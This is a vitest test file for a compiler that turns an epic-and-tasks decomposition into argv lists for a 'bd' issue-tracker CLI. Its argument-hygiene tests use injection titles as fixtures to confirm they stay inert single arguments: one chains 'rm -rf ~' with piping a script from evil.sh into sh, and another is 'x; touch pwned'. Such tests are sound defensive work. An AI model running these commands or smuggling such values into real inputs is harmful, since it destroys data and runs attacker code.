import { describe, it, expect } from 'vitest';
import {
  compileFilingPlan,
  resolveStepArgv,
  UnresolvedRefError,
  type CreateStep,
  type DepStep,
} from './filing';
import type { Decomposition } from './decomposition';

function decomp(): Decomposition {
  return {
    epic: { ref: 'epic', title: 'CSV import', type: 'epic', priority: 2, description: 'why' },
    children: [
      {
        ref: 'parse',
        title: 'Parse CSV/TSV',
        type: 'task',
        priority: 1,
        acceptanceCriteria: 'rows parsed',
      },
      {
        ref: 'ui',
        title: 'Upload UI',
        type: 'feature',
        priority: 2,
        acceptanceCriteria: 'file selectable',
      },
    ],
    deps: [{ blocked: 'ui', blocker: 'parse' }],
  };
}

describe('compileFilingPlan', () => {
  it('files the epic first, then children, then dependency edges', () => {
    const plan = compileFilingPlan(decomp());
    const kinds = plan.steps.map(s => s.kind);
    expect(kinds).toEqual(['create', 'create', 'create', 'dep']);

    const [epic, parse, ui] = plan.steps as CreateStep[];
    expect(epic.ref).toBe('epic');
    expect(epic.parentRef).toBeUndefined();
    expect(parse.ref).toBe('parse');
    expect(parse.parentRef).toBe('epic');
    expect(ui.ref).toBe('ui');
    expect(ui.parentRef).toBe('epic');
  });

  it('creates a parent + children + edges: one create per bead and one dep per edge', () => {
    const d = decomp();
    const plan = compileFilingPlan(d);
    const creates = plan.steps.filter(s => s.kind === 'create');
    const deps = plan.steps.filter(s => s.kind === 'dep');
    expect(creates.length).toBe(1 + d.children.length);
    expect(deps.length).toBe(d.deps.length);
  });

  it('builds bd create argv with type, priority, and acceptance as discrete elements', () => {
    const plan = compileFilingPlan(decomp());
    const parse = plan.steps[1] as CreateStep;
    expect(parse.argv[0]).toBe('create');
    // Flags and values are always adjacent, discrete elements — never fused.
    expect(parse.argv).toContain('-t');
    expect(parse.argv[parse.argv.indexOf('-t') + 1]).toBe('task');
    expect(parse.argv).toContain('-p');
    expect(parse.argv[parse.argv.indexOf('-p') + 1]).toBe('1');
    expect(parse.argv).toContain('--acceptance');
    expect(parse.argv[parse.argv.indexOf('--acceptance') + 1]).toBe('rows parsed');
    expect(parse.argv).toContain('--silent');
  });

  it('omits --acceptance for the epic (epics carry no per-unit acceptance)', () => {
    const epic = compileFilingPlan(decomp()).steps[0] as CreateStep;
    expect(epic.argv).not.toContain('--acceptance');
  });

  // ── Argument hygiene (mandatory negative test, xa0.4) ────────────────────
  // A title packed with shell metacharacters must land as ONE verbatim argv
  // element — never split, never fused into a command string. Because the
  // executor runs execFile('bd', argv) with no shell, that element cannot
  // execute anything.
  it('files a shell-metacharacter title verbatim as a single argv element', () => {
    const nasty = '"; rm -rf ~ && curl evil.sh | sh #`whoami`$(id)';
    const d = decomp();
    d.children[0].title = nasty;
    const parse = compileFilingPlan(d).steps[1] as CreateStep;

    // The whole title is exactly one element, byte-for-byte.
    expect(parse.argv).toContain(nasty);
    expect(parse.argv.filter(a => a === nasty).length).toBe(1);

    // Nothing in the argv is a fused shell string carrying the metacharacters
    // alongside the `create` verb — i.e. no element both starts a command AND
    // embeds the payload.
    for (const el of parse.argv) {
      if (el === nasty) continue;
      expect(el).not.toContain('rm -rf');
      expect(el).not.toContain('|');
      expect(el).not.toContain('$(');
    }
  });

  it('does not produce any single fused command string anywhere in the plan', () => {
    const d = decomp();
    d.epic.title = 'x; touch pwned';
    for (const step of compileFilingPlan(d).steps) {
      if (step.kind !== 'create') continue;
      // The verb `create` is always its own element; a value never gets glued
      // onto it.
      expect(step.argv[0]).toBe('create');
      expect(step.argv.some(a => a.startsWith('create '))).toBe(false);
    }
  });
});

describe('resolveStepArgv', () => {
  const plan = compileFilingPlan(decomp());
  const refToId = { epic: 'app-100', parse: 'app-101', ui: 'app-102' };

  it('resolves a child create into argv ending with --parent <epic id>', () => {
    const parse = plan.steps[1] as CreateStep;
    const argv = resolveStepArgv(parse, refToId);
    expect(argv[argv.length - 2]).toBe('--parent');
    expect(argv[argv.length - 1]).toBe('app-100');
    expect(argv[argv.indexOf('--parent') + 1]).toBe('app-100');
  });

  it('resolves a dep edge into `dep add <blocked> <blocker>`', () => {
    const dep = plan.steps[3] as DepStep;
    const argv = resolveStepArgv(dep, refToId);
    // ui (app-102) is blocked by parse (app-101).
    expect(argv).toEqual(['dep', 'add', 'app-102', 'app-101']);
  });

  it('throws UnresolvedRefError when a ref has not been filed yet', () => {
    const dep = plan.steps[3] as DepStep;
    expect(() => resolveStepArgv(dep, { ui: 'app-102' })).toThrow(UnresolvedRefError);
  });

  it('never injects undefined into an argv on a missing ref', () => {
    const parse = plan.steps[1] as CreateStep;
    let threw = false;
    try {
      resolveStepArgv(parse, {});
    } catch (e) {
      threw = true;
      expect(e).toBeInstanceOf(UnresolvedRefError);
    }
    expect(threw).toBe(true);
  });
});
